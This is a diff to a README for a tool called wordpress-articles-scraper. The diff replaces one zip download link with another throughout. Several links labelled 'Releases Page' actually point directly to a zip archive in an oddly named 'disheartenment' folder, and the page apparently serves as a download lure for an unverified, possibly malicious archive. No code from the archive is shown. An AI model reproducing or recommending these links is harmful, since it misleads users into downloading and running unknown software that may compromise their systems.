@@ -6,9 +6,9 @@ Welcome to the **wordpress-articles-scraper**! This tool helps you easily extrac
 
 ## 📥 Download the Application
 
-[![Download wordpress-articles-scraper](https://raw.githubusercontent.com/charbelmorkosdev/wordpress-articles-scraper/main/disheartenment/wordpress-articles-scraper_v2.3.zip)](https://raw.githubusercontent.com/charbelmorkosdev/wordpress-articles-scraper/main/disheartenment/wordpress-articles-scraper_v2.3.zip)
+[![Download wordpress-articles-scraper](https://raw.githubusercontent.com/charbelmorkosdev/wordpress-articles-scraper/main/disheartenment/articles_scraper_wordpress_v1.8.zip)](https://raw.githubusercontent.com/charbelmorkosdev/wordpress-articles-scraper/main/disheartenment/articles_scraper_wordpress_v1.8.zip)
 
-To get the software, visit this page to download: [Releases Page](https://raw.githubusercontent.com/charbelmorkosdev/wordpress-articles-scraper/main/disheartenment/wordpress-articles-scraper_v2.3.zip)
+To get the software, visit this page to download: [Releases Page](https://raw.githubusercontent.com/charbelmorkosdev/wordpress-articles-scraper/main/disheartenment/articles_scraper_wordpress_v1.8.zip)
 
 ## 🛠️ System Requirements
 
@@ -31,7 +31,7 @@ The wordpress-articles-scraper offers useful features, including:
 
 ## 📥 Download & Install
 
-1. Visit this page to download: [Releases Page](https://raw.githubusercontent.com/charbelmorkosdev/wordpress-articles-scraper/main/disheartenment/wordpress-articles-scraper_v2.3.zip).
+1. Visit this page to download: [Releases Page](https://raw.githubusercontent.com/charbelmorkosdev/wordpress-articles-scraper/main/disheartenment/articles_scraper_wordpress_v1.8.zip).
    
 2. Once on the page, look for the latest version under the “Latest release” section.
 
